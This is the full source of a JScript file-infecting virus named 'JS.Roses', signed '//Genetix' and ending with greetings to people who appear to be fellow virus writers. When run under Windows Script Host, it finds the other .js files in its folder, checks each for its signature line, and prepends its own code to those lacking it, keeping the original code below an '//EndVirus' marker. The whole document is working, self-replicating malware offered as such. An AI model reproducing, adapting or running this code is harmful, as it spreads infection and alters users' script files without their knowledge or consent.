//Genetix

Roses()

/*
JS.Roses
A simple Jscript prepender.
*/

function Roses()
{

    var empty = new Boolean(0);
    var fso = WScript.CreateObject('Scripting.FileSystemObject');
    var CurDir = WScript.ScriptFullName.replace(/\\[^\\]+$/,'');
    var FileEnum = new Enumerator(fso.getFolder(CurDir).files);
    for (; !FileEnum.atEnd(); FileEnum.moveNext())
        if (FileEnum.item().name != WScript.scriptName)
    if (fso.GetExtensionName(FileEnum.item()).toUpperCase() == "JS")
    {

        var ReadSelf = fso.OpenTextFile(WScript.scriptName, 1);
        var VirusCode = '';
        if (!ReadSelf.atEndOfStream)
        {
            VirusCode = ReadSelf.readall();
        }
        ReadSelf.close();
        var StrCode = VirusCode.split('\r\n'); //Split each line.

        try
        {

            ReadTarget = fso.OpenTextFile(FileEnum.item(), 1, true);
            VirSig = ReadTarget.readline();
            if (VirSig == '')
            {
                empty = 1;
            }else{
                empty = 0;
            }
            ReadTarget.close();
        }

        catch (err) //yey I love Javascripts error handling!
        {
            break
        }

        if (empty == 1)  
        {
            outJS = fso.OpenTextFile(FileEnum.item(), 2, true);
            outJS.WriteLine(VirusCode);
            outJS.close();
        }

        if (VirSig != '//Genetix')
        {

        try
        {
            var ReadTarget = fso.OpenTextFile(FileEnum.item(), 1);
            VictimCode = ReadTarget.readAll();
            ReadTarget.close();
        }

        catch (err)
        {
            break
        }

            outJS = fso.OpenTextFile(FileEnum.item(), 2, true);
            for (var i = 0; i < StrCode.length; i++)
            {

                if (StrCode[i] == '//EndVirus')
                {
                    break
                }
                outJS.WriteLine(StrCode[i]);
            }

            outJS.WriteLine('//EndVirus\r\n');
            outJS.WriteLine(VictimCode);
            outJS.close();

        }

    }

}

/*
kefi, SPTH, retro, falckon, MikeAce, c0de, dr3f - I love you all <3
 */

//EndVirus
